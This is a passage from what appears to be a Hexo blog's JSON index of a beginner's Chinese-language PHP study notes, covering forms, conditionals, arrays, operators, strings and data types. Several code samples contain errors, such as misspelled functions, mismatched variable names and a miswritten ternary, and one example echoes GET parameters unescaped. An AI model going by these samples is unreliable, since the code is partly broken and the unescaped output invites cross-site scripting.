/test.php/foo.bar。__FILE_ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 第三个是$_REQUEST PHP $_REQUEST 用于收集HTML表单提交的数据。 以下实例显示了一个输入字段（input）及提交按钮(submit)的表单(form)。 当用户通过点击 “Submit” 按钮提交表单数据时, 表单数据将发送至标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的PHP文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_REQUEST 来收集表单中的 input 字段数据:(官方理解) 这便补充一下：REQUEST：具有$_POST[]$_GET[]的功能，但是$_REQUEST[]会比较慢。通过post和get方法提交的所有数据都可以通过$REQUEST数组获得 12345678910111213141516&#x2F;&#x2F;&lt;!DOCTYPE html&gt;&#x2F;&#x2F;&lt;html&gt;&#x2F;&#x2F;&lt;body&gt;&#x2F;&#x2F;&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;&#x2F;&#x2F;Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;&#x2F;&#x2F;&lt;input type&#x3D;&quot;submit&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;form&gt;&lt;?php $name &#x3D; htmlspecialchars($_REQUEST[&#39;fname&#39;]); echo $name; ?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; PHP$_POST和PHP$_GETPHP $_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”就是上面个实例，展示一下GET在测试当中 按了那个 123456789&#x2F;&#x2F;&lt;html&gt;&#x2F;&#x2F;&lt;body&gt;&#x2F;&#x2F;&lt;?php &#x2F;&#x2F;echo &quot;Study &quot; . $_GET[&#39;subject&#39;] . &quot; @ &quot; . $_GET[&#39;web&#39;];&#x2F;&#x2F;?&gt;&#x2F;&#x2F;&lt;&#x2F;body&gt;&#x2F;&#x2F;&lt;&#x2F;html&gt; 会出现一个GET test的按钮，点一下 就会发送subject 和web的参数 感觉这片很水，可能是因为我html还没学，等我学完了再回来补充拓展","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"PHP if switch 数组","slug":"PHP-if-switch-数组","date":"2020-10-10T16:41:16.000Z","updated":"2020-10-12T16:36:07.403Z","comments":true,"path":"2020/10/11/PHP-if-switch-数组/","link":"","permalink":"http://example.com/2020/10/11/PHP-if-switch-%E6%95%B0%E7%BB%84/","excerpt":"今天学习的是条件语句 首先是if语句听说PHP的内核是C语言编写的，所以很多都和C有点像，这个if语句也是格式是： 1234if（条件）&#123; 条件成立时要执行的代码;//这边有个分号，其他地方没有&#125; 举个例子： 123456&lt;?php $t=22; if($t&gt;&quot;20&quot;)&#123; echo&quot;hwg is cool&quot;;&#125;?&gt; 输出结果是 hwg is cool","text":"今天学习的是条件语句 首先是if语句听说PHP的内核是C语言编写的，所以很多都和C有点像，这个if语句也是格式是： 1234if（条件）&#123; 条件成立时要执行的代码;//这边有个分号，其他地方没有&#125; 举个例子： 123456&lt;?php $t=22; if($t&gt;&quot;20&quot;)&#123; echo&quot;hwg is cool&quot;;&#125;?&gt; 输出结果是 hwg is cool 然后是if…else语句12345678if (*条件*)&#123;*条件成立时执行的代码;*&#125;else&#123;*条件不成立时执行的代码;*&#125; 由于和C都差不多，我就懒得举例了，待会再下面找几个题目过来试试； if…elseif….else 语句感觉这个是会稍微难一点的 123456789101112if (条件)&#123; if 条件成立时执行的代码;&#125;elseif (条件)&#123; elseif 条件成立时执行的代码;&#125;else&#123; 条件不成立时执行的代码;&#125; 例子： 12345678910111213&lt;?php $t=date(&quot;H&quot;);//这里的date（&quot;H&quot;）代表的意思是获取当前的小时数if ($t&lt;&quot;10&quot;)&#123; echo &quot;have a good morning&quot;;&#125;elseif($t&lt;&quot;20&quot;)&#123; echo&quot;have a good dany!&quot;;&#125;else echo &quot;have a good night&quot;;&#125;?&gt; 补充：function data($value) {}如果是date ，那就是用来获取时间的，h 表示小时，并且是12 小时制的；date(‘Y-m-d H:i:s’, time()); // 2015-8-11 9:05:05，第二个参数不传时默认取当前时间戳date(‘Y’) // 年份 2015，大写Y 是4位，小写为2位date(‘m’) // 月份 8date(‘H’) // 小时 9，大写H 是24小时制，小写为12小时制 switch case语句和C也差不多，就说一下想让执行到一个case语句就输出，就得 加break才可以想让他执行完一圈都没得输出，只能在最后输出，就要在最后加default（default 语句用于不存在匹配（即没有 case 为真）时执行。）举个例子： 1234567891011121314151617&lt;?php$favcolor=&quot;red&quot;;switch ($favcolor)&#123;case &quot;red&quot;: echo &quot;你喜欢的颜色是红色!&quot;; break;case &quot;blue&quot;: echo &quot;你喜欢的颜色是蓝色!&quot;; break;case &quot;green&quot;: echo &quot;你喜欢的颜色是绿色!&quot;; break;default: echo &quot;你喜欢的颜色不是 红, 蓝, 或绿色!&quot;;&#125;?&gt; 输出结果是 你喜欢的颜色是红色！ 接下来再来讲一下之前提过的数组首先是array（）函数可以用于创建函数格式是 1array(); 在PHP中，有三种类型的数在 PHP 中，有三种类型的数组： 数值数组 - 带有数字 ID 键的数组有两种创建数值数组的方法： 第一种方法是自动分配ID键； 1$phone=array(&quot;vivo&quot;,&quot;iphone&quot;,&quot;hauwei&quot;);//这样的结果是，vivo会自动变成$phone[0]以此类推 值得注意的是，数组的ID创建是从0开始的 第二种方法是直接创建 12$phone[0]=&quot;vivo&quot;;$phone[1]=&quot;iphone&quot;; 下面运行下实例: 1234&lt;?php$phone=array(&quot;vivo&quot;,&quot;iphone&quot;,&quot;huawei&quot;);echo &quot;I like&quot; . $phone[0] . &quot;,&quot; .$phone[1] . &quot;,&quot;.$phone[2].&quot;.&quot;;?&gt;//输出的结果是我喜欢vivo，iphon，huawei。 关联数组-带有制定的键的数组，每个键关联一个值 通俗点说就是，你要给三个变量都赋予一个相同属性的值，就可以直接用关联数组比如说 1$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); 这样的话，每个人都被赋予了年龄这个属性值举个例子 1234&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);echo &quot;Peter is &quot; . $age[&#x27;Peter&#x27;] . &quot; years old.&quot;;?&gt;//输出的结果是peter is 35years old. 这里有提到一个获取数组的长度-count()函数count()函数用于返回数组的长度（元素的数量）直接放个例子吧 1234&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);echo count($cars);?&gt; 输出的结果是3，原来，这个count输出的是array这个函数数组中所包含的元素数量 遍历数组遍历并打印数值数组中的所有值，可以使用for循环。 123456789&lt;?php$phone=array(&quot;vivo&quot;,&quot;iphone&quot;,&quot;huawei&quot;);$arraylenth=count($iphone);//这边的count（$iphone）就可以直接数出iphone的数组元素长度了for($x=0;$x&lt;$arraylength;x++)&#123; echo $phone[$x]； echo &lt;&quot;br&quot;&gt;;&#125;?&gt; 输出的结果是 vivo iphone huawei遍历并打印关联数组可以使用foreach循环，这里就需要说明一下一下foreach循环了 1234foreach ($array as $value)&#123; 要执行代码;&#125; 1234foreach ($array as $key =&gt; $value)&#123; 要执行代码;&#125; 两个都是foreach循环第一个是，用官方的话来说是，没进行一次循环，当前数组元素的值就会被赋值给$value变量（数组指针会逐一往下移动），在进行下一次循环时，将会看到数组中的键与值我的理解是，（把概念打一遍，突然感觉自己的想法就是概念的想法？），数组的值都会被按顺序以value变量为载体输出 而第二个是，用官方的话来说，每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。我的理解是，他是在上一种的基础上，多增加了一个$key变量，然后将数组的序号或者代称以key的形式输出，，然后另一个value效果和上一个一样就不说了。然后这个key和value是可以替换成其他字母的 例： 1234567&lt;?php$age=array(&quot;hwg&quot; =&gt;&quot;20&quot;,&quot;hsb&quot;=&gt;&quot;21&quot;,&quot;wjs&quot;=&gt;&quot;19&quot;);foreach($age as $value)&#123; echo $value;&#125;?&gt; 12345678&lt;?php$age=array(&quot;hwg&quot; =&gt;&quot;20&quot;,&quot;hsb&quot;=&gt;&quot;21&quot;,&quot;wjs&quot;=&gt;&quot;19&quot;);foreach($age as $name =&gt; $old)&#123; echo &quot;name=&quot;.$name .&quot;, old=&quot; . $old;//echo输出多个值，中间记得要用.连接 echo &quot;&lt;br&gt;&quot;;&#125;?&gt; PHP数组排序 sort() - 对数组进行升序排列 rsort() - 对数组进行降序排列 asort() - 根据关联数组的值，对数组进行升序排列 ksort() - 根据关联数组的键，对数组进行升序排列 arsort() - 根据关联数组的值，对数组进行降序排列 krsort() - 根据关联数组的键，对数组进行降序排列 列举其中一个就好 1234&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);sort($cars);//其中的sort可以替换?&gt; 输出的结果是按照元素的字母升序排列的","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"php运算符 字符串","slug":"php运算符-字符串","date":"2020-10-09T15:29:30.000Z","updated":"2020-10-10T09:55:07.059Z","comments":true,"path":"2020/10/09/php运算符-字符串/","link":"","permalink":"http://example.com/2020/10/09/php%E8%BF%90%E7%AE%97%E7%AC%A6-%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"PHP类型比较PHP变量的比较主要分为两种，就是松散比较：使用两个等号（==）比较，只比较值，不比较类型严格比较：用三个等号（===）比较，都比较 举个例子 123456789101112131415&lt;?phpif(42 == &quot;42&quot;) &#123; echo &#x27;1、值相等&#x27;;&#125;echo PHP_EOL; // 换行符if(42 === &quot;42&quot;) &#123; echo &#x27;2、类型相等&#x27;;&#125; else &#123; echo &#x27;3、不相等&#x27;;&#125;?&gt;输出的结果分别是 值相等 值不相等 接下是PHP的常量设置常量需要使用define（）函数","text":"PHP类型比较PHP变量的比较主要分为两种，就是松散比较：使用两个等号（==）比较，只比较值，不比较类型严格比较：用三个等号（===）比较，都比较 举个例子 123456789101112131415&lt;?phpif(42 == &quot;42&quot;) &#123; echo &#x27;1、值相等&#x27;;&#125;echo PHP_EOL; // 换行符if(42 === &quot;42&quot;) &#123; echo &#x27;2、类型相等&#x27;;&#125; else &#123; echo &#x27;3、不相等&#x27;;&#125;?&gt;输出的结果分别是 值相等 值不相等 接下是PHP的常量设置常量需要使用define（）函数 使用方法如下 1define(&quot;常量的名称&quot;,&quot;常量的值&quot;,(可定义为true也可不写)); 12345&lt;?phpdefine(&quot;hwg&quot;,&quot;wg是帅哥&quot;);echo hwg;//输出是wg是帅哥echo HWG;//无法输出，因为大写未被定义?&gt; 说明1.第一个””是name:必选参数，常量名称，即标志符’2.第二个””是value：必选参数，常量的值。3最后一个交case_insensitive,可选参数，如果设置为TRUE，该常量则大小写不敏感，默认是大小写敏感的。 (常量名不需要加 $ 修饰符)。 举个例子 12345&lt;?phpdefine(&quot;hwg&quot;,&quot;wg是帅哥&quot;,true);echo hwg;//输出是wg是帅哥echo HWG;//输出wg是帅哥?&gt; 最后一点是，常量是全局的，定义完该常量之后只要输出该常量，出来的定义以后的值。 PHP字符串常量例 1234&lt;?php$txt=&quot;Hello world!&quot;;echo $txt;?&gt; php并置运算符123456&lt;?php$txt1=&quot;Hello world!&quot;;$txt2=&quot;What a nice day!&quot;;echo $txt1 . &quot; &quot; . $txt2;?&gt;//输出Hello world! What a nice day! PHP strlen()函数用知道字符串的长度 123&lt;?phpecho strlen(&quot;Hello world!&quot;);?&gt; PHP strpos() 函数定义和用法strpos() 函数查找字符串在另一字符串中第一次出现的位置。 注释：strpos() 函数对大小写敏感。若没有找到，则返回strpos有两种类型的返回值，一种是整型，一种是bool型。 注释：该函数是二进制安全的。例子 123&lt;?phpecho strops(&quot;you are hansom&quot;,&quot;are&quot;);?&gt; 输出结果是4（计算方法如下：从第一个y为0开始算起，空格也算一个，所以到a之前一共有4个字节） 相关函数： stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写） strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写） strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写） 参考链接https://www.w3school.com.cn/php/func_string_strpos.asp PHP运算符基本和C中的差不多，我就整理一下和C不一样的吧第一个是intdiv（）函数：该函数返回值为第一个参数除于第二个参数的值并取等（向下取等）例： 123&lt;?php var_dump(intdiv(10, 3)); ?&gt; 输出的值是int（3）有一些运算符不太一样比如不等于的表示方法有&lt;&gt;和!=绝对等于有=== 逻辑运算符：![X~KPJ$LXMK`4BK1HHQL4RP5](https://raw.githubusercontent.com/Hwwg/myphoto/master/X%7EKPJ%24LXMK%604BK1HHQL4RP5.png) 参考https://www.runoob.com/php/php-operators.html PHP三元运算符这个和if else语句有点像，我先聊聊三元运算符三元运算符的格式(expr1) ? (expr2) : (expr3)解释：如果条件”expr1”成立，则执行语句”expr2”,否则执行”expr3” 举个例子 1234&lt;?php$b = 20;echo $b=19?&quot;yes&quot;:&quot;no&quot;;?&gt; 输出结果是no转换成if语句就是 1234if（$b==20）&#123;echo &quot;yes&quot;;&#125;else&#123;echo&quot;no&quot;;&#125; 三元运算符的有点之处在于他很简练，还有更强大的应用，这里放个链接https://www.php.cn/php-weizijiaocheng-383293.html举个菜鸟教程的例子 12345678910&lt;?php$test = &#x27;菜鸟教程&#x27;;// 普通写法$username = isset($test) ? $test : &#x27;nobody&#x27;;echo $username, PHP_EOL;// PHP 5.3+ 版本写法$username = $test ?: &#x27;nobody&#x27;;echo $username, PHP_EOL;//PHP_EOL的意思是一个换行符?&gt; 在这个代码里面输出的都是菜鸟教程 今天先到这里吧。哈哈哈哈哈 补充一下组合比较符组合比较运算符：可以轻松实现两个变量的比较，当啊然不仅限于数值类数据的比较符号是:&lt;=&gt;语法格式如下：$c=$a&lt;=&gt;$b;解析一下解析如下： 如果 $a &gt; $b, 则 $c 的值为 1。 如果 $a == $b, 则 $c 的值为 0。 如果 $a &lt; $b, 则 $c 的值为 -1。实例 12345678910111213141516&lt;?php// 整型echo 1 &lt;=&gt; 1; // 0echo 1 &lt;=&gt; 2; // -1echo 2 &lt;=&gt; 1; // 1// 浮点型echo 1.5 &lt;=&gt; 1.5; // 0echo 1.5 &lt;=&gt; 2.5; // -1echo 2.5 &lt;=&gt; 1.5; // 1// 字符串echo &quot;a&quot; &lt;=&gt; &quot;a&quot;; // 0echo &quot;a&quot; &lt;=&gt; &quot;b&quot;; // -1echo &quot;b&quot; &lt;=&gt; &quot;a&quot;; // 1?&gt;","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"postPHP efo&数据类型","slug":"postPHP-efo-数据类型","date":"2020-10-08T04:53:46.000Z","updated":"2020-10-11T01:15:58.273Z","comments":true,"path":"2020/10/08/postPHP-efo-数据类型/","link":"","permalink":"http://example.com/2020/10/08/postPHP-efo-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","excerpt":"EOF指令echo &lt;&lt;&lt;EOF//要输出的字符EFO; 需要注意的点有1.EOF其实可以用其他字母来表示2.结尾必须要有分号3 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。接下来掩饰一段 123456789&lt;?php$name=&quot;runoob&quot;;$a= *&lt;&lt;&lt;EOF &quot;abc&quot;$name &quot;123&quot;EOF*;*// 结束需要独立一行且前后不能空格*echo $a;?&gt; 输出结果是 “abc”ronoob “123” 数据类型字符串在PHP中，其实””和’’里面都是可以加要输出的文本的，和C有些不一样","text":"EOF指令echo &lt;&lt;&lt;EOF//要输出的字符EFO; 需要注意的点有1.EOF其实可以用其他字母来表示2.结尾必须要有分号3 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。接下来掩饰一段 123456789&lt;?php$name=&quot;runoob&quot;;$a= *&lt;&lt;&lt;EOF &quot;abc&quot;$name &quot;123&quot;EOF*;*// 结束需要独立一行且前后不能空格*echo $a;?&gt; 输出结果是 “abc”ronoob “123” 数据类型字符串在PHP中，其实””和’’里面都是可以加要输出的文本的，和C有些不一样 整型，浮点型，布尔型，数组，对象这里要先引入一个函数var_dump($变量字符)，他是可以用来返回变量的数据类型和值（这句话没有很理解，返回值的意思是我发出一个值，通过这个函数，返回来了另一个值？但是后面又说没有返回值？？） 1234567891011&lt;?PHP$a = &quot;alsdflasdf;a&quot;;$b = var_dump($a);echo &quot;&lt;br&gt;&quot;;//var_dump($c);$d=var_dump($c);echo &quot;&lt;br&gt;&quot;;//输出一个换行符的意思echo $a;echo &quot;&lt;br&gt;&quot;;//同理echo $b;echo &quot;&lt;br&gt;&quot;; 输出的值为 12345string(12) &quot;alsdflasdf;a&quot;&#x2F;&#x2F;这边的string（12）的意思是输出的第一个元素类型长度为12NULLalsdflasdf;a 这里分析一下这个var_dump吧，从上面这个代码分析可以看出该函数和echo的输出类型不太一样 在php下:echo 输出的是变量和字符串; var_dump 输出的是变量类型,变量长度和变量值,输出的会更详细; 接下来是整型变量 感觉和C的没多大差别，就不着重讲了，以后遇到特别的没想到的再来补充 浮点型同理整型布尔型感觉不是很懂https://www.cnblogs.com/xielong/p/9874955.html先记录网址，以后遇到具体问题的再来回顾数组数组:可以在一个变量中存储多个值 1234&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);?&gt; 可以输出 12345678array(3) &#123; [0]=&gt; string(5) &quot;Volvo&quot; [1]=&gt; string(3) &quot;BMW&quot; [2]=&gt; string(6) &quot;Toyota&quot;&#125; 就可以把数组内容完全输出出来，但是你用echo就只能输出array？还是挺神奇的。PHP对象首先需要用class关键字声明类对象这个格式是这样的 12345678910111213&lt;?phpclass Person//类名&#123; //括号里写类的定义 public $age; //属性对应的是变量 public function eat () //行为对应的是方法 &#123; echo &#x27;我在吃饭&#x27;; &#125;&#125;$xiaoming = new Person();//小括号可加可不加，推荐都加var_dump($xiaoming- &gt;age = 18)；//通过对象来访问自己的属性和方法添加-&gt;(你要访问的属性和方法的字符)，前面无$，然后这个age也可以在上面写一行$xiaoming- &gt;age = 18;，然后下面写var_dump($xiaoming-&gt;age);$xiaoming-&gt;eat()；//这样就可以访问自己的方法，后面有括号 创建对象的第二个方法 $name = ‘person’; $xiaoming = new $name(); 命名规范 类名遵从大驼峰原则： persontest====&gt;PersonTest(每个单词的首字母要大写)这里才陈述一下创建对象的意义吧：创建完对象的类别，并且定义好他的属性，下次在运用时，你只要$(想要赋值的变量)=new （你定义的类）（）这样你想要赋值的变量就可以拥有类别的属性，并且可以在细操属性的值。 后续如果需要继续学习对象相关知识，再来补充接下来是PHP NULL值 就是表示一个变量为空值，可以直接设置NULL来清空一个变量的值例： 12345&lt;?php$x=&#x27;hello world&#x27;;$x=null;var_dump($x);?&gt; 这个比较简单就不过多陈述了 今天先到这里了，下次再来继续","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"PHP学习","slug":"PHP学习","date":"2020-10-06T03:50:34.000Z","updated":"2020-10-06T04:08:49.726Z","comments":true,"path":"2020/10/06/PHP学习/","link":"","permalink":"http://example.com/2020/10/06/PHP%E5%AD%A6%E4%B9%A0/","excerpt":"PHP的基本语法123&lt;?phpPHP 代码?&gt; 展示一下实例 123&lt;?phpecho &quot;Hello World!&quot;;?&gt; PHP的变量作用域变量的作用域是脚本中变量可被引用/使用的部分。","text":"PHP的基本语法123&lt;?phpPHP 代码?&gt; 展示一下实例 123&lt;?phpecho &quot;Hello World!&quot;;?&gt; PHP的变量作用域变量的作用域是脚本中变量可被引用/使用的部分。 PHP 有四种不同的变量作用域： local global static parameter 着重讲一下 global和static吧首先是global，在函数内部施加该命令，变量在函数内部可以引用函数外部的值 12345678910111213&lt;?php$x=5;$y=10;function myTest()&#123; global $x,$y; $y=$x+$y;&#125;myTest();echo $y; // 输出 15?&gt; 接下来是static命令，就是你在对一个变量施加该命令后，该变量的值发生改变后，在下次使用该变量时，这个值的量已经不在是初始量，而是变化后的量 12345678910111213&lt;?phpfunction myTest()&#123; static $x=0; echo $x; $x++; echo PHP_EOL; // 换行符&#125;myTest();myTest();myTest();?&gt; 输出的值是0 1 2 当我把static这个指令删除后，输出的值就变成了000 最后是echo和print输出语句格式都是”输出内容”，不过区别在于，echo可以这样:echo”输””出””代码”，而print 只能一次性输出","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"my first time to use typro","slug":"my-first-time-to-use-typro","date":"2020-10-04T16:34:04.000Z","updated":"2020-10-24T14:19:09.176Z","comments":true,"path":"2020/10/05/my-first-time-to-use-typro/","link":"","permalink":"http://example.com/2020/10/05/my-first-time-to-use-typro/","excerpt":"","text":"第一次使用typro","categories":[],"tags":[{"name":"typro","slug":"typro","permalink":"http://example.com/tags/typro/"},{"name":"hexo","slug":"hexo","permalink":"http://example.com/tags/hexo/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-10-01T12:13:48.763Z","updated":"2020-10-01T12:13:48.763Z","comments":true,"path":"2020/10/01/hello-world/","link":"","permalink":"http://example.com/2020/10/01/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"MYSQL","slug":"MYSQL","permalink":"http://example.com/tags/MYSQL/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"typro","slug":"typro","permalink":"http://example.com/tags/typro/"},{"name":"hexo","slug":"hexo","permalink":"http://example.com/tags/hexo/"}]}